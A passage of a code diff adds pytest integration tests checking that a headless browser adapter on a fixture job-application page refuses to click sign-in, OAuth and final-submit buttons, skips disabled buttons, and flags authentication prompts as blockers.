+            ("continue-with-account-button", False),
+            ("continue-via-google-button", False),
+            ("continue-using-example-button", False),
+            ("next-with-google-button", False),
+            ("apply-submit", True),
+        )
+        for element_id, continuation in forbidden:
+            observation = session.observe()
+            button = next(item for item in observation["buttons"] if item["element_id"] == element_id)
+            with pytest.raises(BrowserAdapterError, match="final_or_anchor_not_automated"):
+                session.click_offline(button["target_id"], continuation=continuation)
+
+        assert session.observe()["url"] == logical_url
+        counters = session.network_counters()
+        assert counters["terminal_reason"] is None
+        assert FixtureHandler.attacker_http_requests == 0
+        assert FixtureHandler.final_like_requests == 0
+
+
+@BROWSER_INTEGRATION_SKIP
+def test_inherited_disabled_button_is_observed_disabled_and_not_dispatched(fixture_server):
+    transport_url = fixture_server.replace("/clean", "/continue-native-disabled-fieldset")
+    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
+    with PuppeteerSession.start(
+        headless=True,
+        session_id="session-native-disabled-fieldset",
+        run_id=48,
+        job_id=123,
+        internal_transport_url=transport_url,
+    ) as session:
+        session.goto(logical_url)
+        observation = session.observe()
+        disabled = next(
+            button
+            for button in observation["buttons"]
+            if button["element_id"] == "disabled-continue"
+        )
+        assert disabled["enabled"] is False
+
+        with pytest.raises(BrowserAdapterError, match="target_not_actionable"):
+            session.click_offline(disabled["target_id"], continuation=False)
+
+        after = session.observe()
+        assert not any(
+            button["element_id"] == "disabled-listener-marker"
+            for button in after["buttons"]
+        )
+        assert session.network_counters()["terminal_reason"] is None
+        assert FixtureHandler.final_like_requests == 0
+
+@BROWSER_INTEGRATION_SKIP
+def test_native_auth_controls_are_observation_blockers(fixture_server):
+    transport_url = fixture_server.replace("/clean", "/continue-native-auth-blocker")
+    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
+    with PuppeteerSession.start(
+        headless=True,
+        session_id="session-native-auth-blocker",
+        run_id=46,
+        job_id=123,
+        internal_transport_url=transport_url,
+    ) as session:
+        session.goto(logical_url)
+        observation = session.observe()
+        blockers = [blocker for blocker in observation["blockers"] if blocker["code"] == "authentication_required"]
+        assert blockers
+        assert any("Sign in" in blocker["text"] for blocker in blockers)
+        assert any(button["element_id"] == "sign-in-button" for button in observation["buttons"])
+        assert any(button["element_id"] == "create-account-button" for button in observation["buttons"])
+        assert session.network_counters()["terminal_reason"] is None
+
 @pytest.mark.parametrize(
     "endpoint",
     (
@@ -2227,4 +2949,4 @@ def test_runner_request_guard_self_test() -> None:
         check=False,
     )
     assert result.returncode == 0, result.stderr.decode()
-    assert _decode_frames(result.stdout) == [{"ok": True, "data": {"passed": 9}}]
+    assert _decode_frames(result.stdout) == [{"ok": True, "data": {"passed": 14}}]
